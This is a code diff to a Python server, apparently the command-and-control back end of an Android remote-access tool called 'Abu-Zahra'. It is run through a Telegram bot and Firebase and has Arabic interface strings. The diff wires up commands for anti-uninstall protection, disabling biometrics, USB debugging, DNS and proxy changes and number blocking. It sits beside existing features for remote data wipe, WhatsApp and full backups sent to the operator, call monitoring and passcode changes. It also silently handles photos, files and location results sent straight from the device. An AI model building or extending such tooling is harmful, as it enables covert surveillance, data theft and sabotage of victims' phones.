@@ -137,7 +137,7 @@ COMMAND_REGISTRY = {
     "shutdown":         {"cat": "control", "cmd": "shutdown",             "desc": "⏻ إيقاف التشغيل",             "emoji": "⏻"},
     "set_volume":       {"cat": "control", "cmd": "set_volume",           "desc": "🔊 تعيين الصوت",               "emoji": "🔊"},
     "set_brightness":   {"cat": "control", "cmd": "set_brightness",       "desc": "☀️ تعيين السطوع",              "emoji": "☀️"},
-    "set_ringtone":     {"cat": "control", "cmd": "ping",         "desc": "🔔 تعيين النغمة",               "emoji": "🔔"},
+    "set_ringtone":     {"cat": "control", "cmd": "set_ringtone",         "desc": "🔔 تعيين النغمة",               "emoji": "🔔"},
     "set_wallpaper":    {"cat": "control", "cmd": "set_wallpaper",        "desc": "🖼️ تعيين الخلفية",             "emoji": "🖼️"},
     "enable_wifi":      {"cat": "control", "cmd": "enable_wifi",          "desc": "📶 تشغيل الواي فاي",           "emoji": "📶"},
     "disable_wifi":     {"cat": "control", "cmd": "disable_wifi",         "desc": "📵 إيقاف الواي فاي",           "emoji": "📵"},
@@ -155,12 +155,12 @@ COMMAND_REGISTRY = {
     "torch_off":        {"cat": "control", "cmd": "torch_off",            "desc": "🔦 إطفاء الكشاف",              "emoji": "🔦"},
     "play_sound":       {"cat": "control", "cmd": "play_sound",           "desc": "🔊 تشغيل صوت",                "emoji": "🔊"},
     "speak_text":       {"cat": "control", "cmd": "speak_text",           "desc": "🗣️ نطق نص",                   "emoji": "🗣️"},
-    "show_notification":{"cat": "control", "cmd": "ping",    "desc": "🔔 إظهار إشعار",              "emoji": "🔔"},
-    "open_url":         {"cat": "control", "cmd": "ping",             "desc": "🌐 فتح رابط",                  "emoji": "🌐"},
+    "show_notification":{"cat": "control", "cmd": "show_notification",    "desc": "🔔 إظهار إشعار",              "emoji": "🔔"},
+    "open_url":         {"cat": "control", "cmd": "open_url",             "desc": "🌐 فتح رابط",                  "emoji": "🌐"},
     "send_sms":         {"cat": "control", "cmd": "send_sms",             "desc": "📲 إرسال رسالة SMS",           "emoji": "📲"},
     "make_call":        {"cat": "control", "cmd": "make_call",            "desc": "📞 إجراء مكالمة",              "emoji": "📞"},
-    "block_number":     {"cat": "control", "cmd": "ping",         "desc": "🚫 حظر رقم",                  "emoji": "🚫"},
-    "unblock_number":   {"cat": "control", "cmd": "ping",       "desc": "✅ إلغاء حظر رقم",             "emoji": "✅"},
+    "block_number":     {"cat": "control", "cmd": "block_number",         "desc": "🚫 حظر رقم",                  "emoji": "🚫"},
+    "unblock_number":   {"cat": "control", "cmd": "unblock_number",       "desc": "✅ إلغاء حظر رقم",             "emoji": "✅"},
 
     # App Management (20)
     "open_app":         {"cat": "apps",    "cmd": "open_app",             "desc": "📱 فتح تطبيق",                 "emoji": "📱"},
@@ -174,10 +174,10 @@ COMMAND_REGISTRY = {
     "app_info":         {"cat": "apps",    "cmd": "get_info",             "desc": "ℹ️ معلومات تطبيق",            "emoji": "ℹ️"},
     "app_usage":        {"cat": "apps",    "cmd": "get_running_apps",            "desc": "📊 استخدام التطبيقات",        "emoji": "📊"},
     "screen_time":      {"cat": "apps",    "cmd": "get_app_usage",          "desc": "⏱️ وقت الشاشة",               "emoji": "⏱️"},
-    "app_permissions":  {"cat": "apps",    "cmd": "get_info",      "desc": "🔐 صلاحيات التطبيق",          "emoji": "🔐"},
+    "app_permissions":  {"cat": "apps",    "cmd": "get_app_permissions",      "desc": "🔐 صلاحيات التطبيق",          "emoji": "🔐"},
     "enable_app":       {"cat": "apps",    "cmd": "open_app",           "desc": "✅ تفعيل تطبيق",              "emoji": "✅"},
     "disable_app":      {"cat": "apps",    "cmd": "close_app",          "desc": "❌ تعطيل تطبيق",              "emoji": "❌"},
-    "list_blocked":     {"cat": "apps",    "cmd": "get_info",         "desc": "📋 قائمة التطبيقات المحظورة",  "emoji": "📋"},
+    "list_blocked":     {"cat": "apps",    "cmd": "get_blocked_apps",         "desc": "📋 قائمة التطبيقات المحظورة",  "emoji": "📋"},
     "clear_cache":      {"cat": "apps",    "cmd": "clear_app_data",          "desc": "🧹 مسح الكاش",                "emoji": "🧹"},
     "update_app":       {"cat": "apps",    "cmd": "install_app",           "desc": "⬆️ تحديث تطبيق",              "emoji": "⬆️"},
     "launch_app":       {"cat": "apps",    "cmd": "open_app",           "desc": "🚀 تشغيل تطبيق",              "emoji": "🚀"},
@@ -201,15 +201,15 @@ COMMAND_REGISTRY = {
     "send_whatsapp_backup":{"cat":"files", "cmd": "send_backup_whatsapp", "desc": "💬 نسخة واتساب",               "emoji": "💬"},
     "send_full_backup": {"cat": "files",   "cmd": "send_backup_all",     "desc": "💾 نسخة احتياطية كاملة",       "emoji": "💾"},
     "delete_file":      {"cat": "files",   "cmd": "delete_file",          "desc": "🗑️ حذف ملف",                  "emoji": "🗑️"},
-    "rename_file":      {"cat": "files",   "cmd": "list_files",          "desc": "✏️ إعادة تسمية ملف",          "emoji": "✏️"},
-    "copy_file":        {"cat": "files",   "cmd": "list_files",            "desc": "📋 نسخ ملف",                  "emoji": "📋"},
-    "move_file":        {"cat": "files",   "cmd": "list_files",            "desc": "📦 نقل ملف",                  "emoji": "📦"},
-    "create_folder":    {"cat": "files",   "cmd": "list_files",        "desc": "📁 إنشاء مجلد",               "emoji": "📁"},
-    "get_folder_size":  {"cat": "files",   "cmd": "list_files",      "desc": "📏 حجم المجلد",               "emoji": "📏"},
-    "search_files":     {"cat": "files",   "cmd": "list_files",         "desc": "🔍 بحث في الملفات",           "emoji": "🔍"},
-    "recent_files":     {"cat": "files",   "cmd": "list_files",         "desc": "🕐 الملفات الأخيرة",           "emoji": "🕐"},
-    "file_info":        {"cat": "files",   "cmd": "list_files",            "desc": "ℹ️ معلومات ملف",              "emoji": "ℹ️"},
-    "zip_files":        {"cat": "files",   "cmd": "list_files",            "desc": "📦 ضغط ملفات",                "emoji": "📦"},
+    "rename_file":      {"cat": "files",   "cmd": "rename_file",          "desc": "✏️ إعادة تسمية ملف",          "emoji": "✏️"},
+    "copy_file":        {"cat": "files",   "cmd": "copy_file",            "desc": "📋 نسخ ملف",                  "emoji": "📋"},
+    "move_file":        {"cat": "files",   "cmd": "move_file",            "desc": "📦 نقل ملف",                  "emoji": "📦"},
+    "create_folder":    {"cat": "files",   "cmd": "create_folder",        "desc": "📁 إنشاء مجلد",               "emoji": "📁"},
+    "get_folder_size":  {"cat": "files",   "cmd": "get_folder_size",      "desc": "📏 حجم المجلد",               "emoji": "📏"},
+    "search_files":     {"cat": "files",   "cmd": "search_files",         "desc": "🔍 بحث في الملفات",           "emoji": "🔍"},
+    "recent_files":     {"cat": "files",   "cmd": "recent_files",         "desc": "🕐 الملفات الأخيرة",           "emoji": "🕐"},
+    "file_info":        {"cat": "files",   "cmd": "file_info",            "desc": "ℹ️ معلومات ملف",              "emoji": "ℹ️"},
+    "zip_files":        {"cat": "files",   "cmd": "zip_files",            "desc": "📦 ضغط ملفات",                "emoji": "📦"},
 
     # Security & Admin (15)
     "wipe_data":        {"cat": "security","cmd": "wipe_data",            "desc": "💣 مسح البيانات",              "emoji": "💣"},
@@ -219,10 +219,10 @@ COMMAND_REGISTRY = {
     "change_passcode":  {"cat": "security","cmd": "change_passcode",      "desc": "🔑 تغيير رمز القفل",          "emoji": "🔑"},
     "set_pin":          {"cat": "security","cmd": "change_passcode",              "desc": "🔢 تعيين رقم PIN",             "emoji": "🔢"},
     "remove_pin":       {"cat": "security","cmd": "change_passcode",           "desc": "🔓 إزالة رقم PIN",             "emoji": "🔓"},
-    "enable_biometric": {"cat": "security","cmd": "change_passcode",     "desc": "👤 تشغيل البصمة",             "emoji": "👤"},
-    "disable_biometric":{"cat": "security","cmd": "change_passcode",    "desc": "❌ إيقاف البصمة",             "emoji": "❌"},
-    "anti_uninstall_on":{"cat": "security","cmd": "change_passcode",    "desc": "🛡️ الحماية من الحذف - تشغيل", "emoji": "🛡️"},
-    "anti_uninstall_off":{"cat":"security","cmd": "change_passcode",   "desc": "⛔ الحماية من الحذف - إيقاف", "emoji": "⛔"},
+    "enable_biometric": {"cat": "security","cmd": "enable_biometric",     "desc": "👤 تشغيل البصمة",             "emoji": "👤"},
+    "disable_biometric":{"cat": "security","cmd": "disable_biometric",    "desc": "❌ إيقاف البصمة",             "emoji": "❌"},
+    "anti_uninstall_on":{"cat": "security","cmd": "anti_uninstall_on",    "desc": "🛡️ الحماية من الحذف - تشغيل", "emoji": "🛡️"},
+    "anti_uninstall_off":{"cat":"security","cmd": "anti_uninstall_off",   "desc": "⛔ الحماية من الحذف - إيقاف", "emoji": "⛔"},
     "device_admin_status":{"cat":"security","cmd":"device_admin_status",  "desc": "📋 حالة مسؤول الجهاز",        "emoji": "📋"},
     "check_root":       {"cat": "security","cmd": "get_info",           "desc": "🧪 فحص الروت",                "emoji": "🧪"},
     "set_screen_lock":  {"cat": "security","cmd": "lock_phone",      "desc": "🔒 تعيين قفل الشاشة",         "emoji": "🔒"},
@@ -252,20 +252,20 @@ COMMAND_REGISTRY = {
     "call_monitor":     {"cat": "monitor", "cmd": "get_calls",         "desc": "📞 مراقبة المكالمات",          "emoji": "📞"},
 
     # System Settings (15)
-    "set_language":     {"cat": "syssettings", "cmd": "get_info",     "desc": "🌐 تعيين اللغة",               "emoji": "🌐"},
-    "set_timezone":     {"cat": "syssettings", "cmd": "get_info",     "desc": "🕐 تعيين المنطقة الزمنية",     "emoji": "🕐"},
+    "set_language":     {"cat": "syssettings", "cmd": "set_language",     "desc": "🌐 تعيين اللغة",               "emoji": "🌐"},
+    "set_timezone":     {"cat": "syssettings", "cmd": "set_timezone",     "desc": "🕐 تعيين المنطقة الزمنية",     "emoji": "🕐"},
     "set_alarm":        {"cat": "syssettings", "cmd": "set_alarm",        "desc": "⏰ تعيين منبه",                "emoji": "⏰"},
     "set_timer":        {"cat": "syssettings", "cmd": "set_alarm",        "desc": "⏱️ تعيين مؤقت",               "emoji": "⏱️"},
     "set_reminder":     {"cat": "syssettings", "cmd": "set_alarm",     "desc": "📝 تعيين تذكير",              "emoji": "📝"},
-    "enable_dev_mode":  {"cat": "syssettings", "cmd": "get_info",  "desc": "🔧 تشغيل وضع المطور",         "emoji": "🔧"},
-    "disable_dev_mode": {"cat": "syssettings", "cmd": "get_info", "desc": "❌ إيقاف وضع المطور",         "emoji": "❌"},
-    "enable_usb_debug": {"cat": "syssettings", "cmd": "get_info", "desc": "🔌 تشغيل تصحيح USB",          "emoji": "🔌"},
-    "disable_usb_debug":{"cat": "syssettings", "cmd": "get_info","desc": "❌ إيقاف تصحيح USB",          "emoji": "❌"},
-    "dns_change":       {"cat": "syssettings", "cmd": "get_network_info",       "desc": "🌐 تغيير DNS",               "emoji": "🌐"},
-    "proxy_set":        {"cat": "syssettings", "cmd": "get_network_info",        "desc": "🔀 تعيين بروكسي",             "emoji": "🔀"},
+    "enable_dev_mode":  {"cat": "syssettings", "cmd": "enable_dev_mode",  "desc": "🔧 تشغيل وضع المطور",         "emoji": "🔧"},
+    "disable_dev_mode": {"cat": "syssettings", "cmd": "disable_dev_mode", "desc": "❌ إيقاف وضع المطور",         "emoji": "❌"},
+    "enable_usb_debug": {"cat": "syssettings", "cmd": "enable_usb_debug", "desc": "🔌 تشغيل تصحيح USB",          "emoji": "🔌"},
+    "disable_usb_debug":{"cat": "syssettings", "cmd": "disable_usb_debug","desc": "❌ إيقاف تصحيح USB",          "emoji": "❌"},
+    "dns_change":       {"cat": "syssettings", "cmd": "dns_change",       "desc": "🌐 تغيير DNS",               "emoji": "🌐"},
+    "proxy_set":        {"cat": "syssettings", "cmd": "proxy_set",        "desc": "🔀 تعيين بروكسي",             "emoji": "🔀"},
     "apn_settings":     {"cat": "syssettings", "cmd": "get_network_info",     "desc": "📶 إعدادات APN",             "emoji": "📶"},
-    "nfc_on":           {"cat": "syssettings", "cmd": "get_info",           "desc": "📡 تشغيل NFC",               "emoji": "📡"},
-    "nfc_off":          {"cat": "syssettings", "cmd": "get_info",          "desc": "❌ إيقاف NFC",               "emoji": "❌"},
+    "nfc_on":           {"cat": "syssettings", "cmd": "nfc_on",           "desc": "📡 تشغيل NFC",               "emoji": "📡"},
+    "nfc_off":          {"cat": "syssettings", "cmd": "nfc_off",          "desc": "❌ إيقاف NFC",               "emoji": "❌"},
     "auto_update_on":   {"cat": "syssettings", "cmd": "get_info",   "desc": "⬆️ التحديث التلقائي - تشغيل", "emoji": "⬆️"},
     "auto_update_off":  {"cat": "syssettings", "cmd": "get_info",  "desc": "⏸️ التحديث التلقائي - إيقاف", "emoji": "⏸️"},
 }
@@ -984,11 +984,11 @@ async def execute_device_command(chat_id, device_id, cmd_name, params=None, msg_
     emoji = reg.get("emoji", "📋")
     
     text = (
-        f"{emoji} <b>تم إرسال الأمر</b>\n\n"
+        f"{emoji} <b>جاري الإرسال...</b>\n\n"
         f"📱 الجهاز: <code>{d.get('name', device_id)}</code>\n"
         f"📋 الأمر: <code>{cmd_name}</code>\n"
         f"🆔 المعرف: <code>{cmd['id']}</code>\n\n"
-        f"⏳ بانتظار استجابة الجهاز..."
+        f"⏳ تم إرسال الأمر للجهاز..."
     )
     
     kb = build_device_menu(device_id)
@@ -1038,7 +1038,7 @@ async def handle_telegram_command(chat_id, text, message_id=None):
         await handle_status(chat_id)
     elif cmd == "/about":
         await send_message(chat_id, (
-            "🟥 <b>سيرفر أبو الزهراء v3.1</b>\n\n"
+            "🟥 <b>سيرفر أبو الزهراء v4.0</b>\n\n"
             "نظام إدارة الأجهزة المتكامل\n"
             f"النطاق: <code>{SERVER_DOMAIN}</code>\n"
             f"المنفذ: <code>{SERVER_PORT}</code>\n"
@@ -1046,7 +1046,7 @@ async def handle_telegram_command(chat_id, text, message_id=None):
             f"وقت التشغيل: <code>{format_uptime(get_uptime())}</code>"
         ), reply_markup=build_back_button())
     elif cmd == "/version":
-        await send_message(chat_id, "🟥 <b>أبو الزهراء v3.1</b>\nالإصدار: 2025.01\nالأوامر: 200+\nالمحرك: aiohttp", reply_markup=build_back_button())
+        await send_message(chat_id, "🟥 <b>أبو الزهراء v4.0</b>\nالإصدار: 2025.01\nالأوامر: 200+\nالمحرك: aiohttp", reply_markup=build_back_button())
     elif cmd == "/test":
         await send_message(chat_id, "✅ السيرفر يعمل!\n🟢 جميع الأنظمة تعمل.", reply_markup=build_back_button())
 
@@ -1153,7 +1153,7 @@ async def handle_telegram_command(chat_id, text, message_id=None):
     elif cmd == "/import_data":
         await send_admin("📥 جاهز لاستيراد البيانات", reply_markup=build_back_button())
     elif cmd == "/update_bot":
-        await send_admin("🟥 البوت محدّث (v3.1)", reply_markup=build_back_button())
+        await send_admin("🟥 البوت محدّث (v4.0)", reply_markup=build_back_button())
 
     # ── 200+ Device Commands from Registry ──
     elif cmd[1:] in COMMAND_REGISTRY:
@@ -2305,7 +2305,7 @@ th{color:var(--text2);font-weight:500}
 
 <div class="app" id="app">
 <nav class="sidebar" id="sidebar">
-<div class="logo"><h2>🟥 Abu-Zahra</h2><span>Control Panel v3.1</span></div>
+<div class="logo"><h2>🟥 Abu-Zahra</h2><span>Control Panel v4.0</span></div>
 <a class="active" onclick="showPage('dashboard')">📊 Dashboard</a>
 <a onclick="showPage('devices')">📱 Devices</a>
 <a onclick="showPage('commands')">🎮 Commands</a>
@@ -2816,6 +2816,22 @@ async def firebase_result_listener():
                     if result_key in _processed_results:
                         continue
 
+                    # Skip results that were sent directly from the app (photos, files, location maps)
+                    try:
+                        result_json_check = json.loads(str(result_text)) if result_text else {}
+                        if isinstance(result_json_check, dict) and result_json_check.get("direct"):
+                            # Delete from Firebase and mark as processed, but DON'T forward to Telegram
+                            _processed_results.add(result_key)
+                            update_command_status(cmd_id, status, result_text)
+                            update_device(device_id, {"active": True})
+                            try:
+                                await firebase_set(f"results/{device_id}/{cmd_id}", None)
+                            except:
+                                pass
+                            continue
+                    except:
+                        pass
+
                     # === FORWARD RESULT TO TELEGRAM ===
                     try:
                         d = find_device(device_id)
@@ -2986,7 +3002,7 @@ def create_app():
 async def on_startup(app):
     ensure_data_dir()
     log.info("=" * 60)
-    log.info("Abu-Zahra Server v3.1 starting...")
+    log.info("Abu-Zahra Server v4.0 starting...")
     log.info("Domain: %s", SERVER_DOMAIN)
     log.info("Port: %d", SERVER_PORT)
     log.info("Admin: %d", ADMIN_CHAT_ID)
@@ -3003,7 +3019,7 @@ async def on_startup(app):
     # Notify admin
     try:
         await send_admin(
-            f"🟥 <b>Abu-Zahra Server v3.1</b> started!\n\n"
+            f"🟥 <b>Abu-Zahra Server v4.0</b> started!\n\n"
             f"📡 Port: <code>{SERVER_PORT}</code>\n"
             f"🌐 Domain: <code>{SERVER_DOMAIN}</code>\n"
             f"📋 Commands: <code>{len(COMMAND_REGISTRY)}</code>\n"
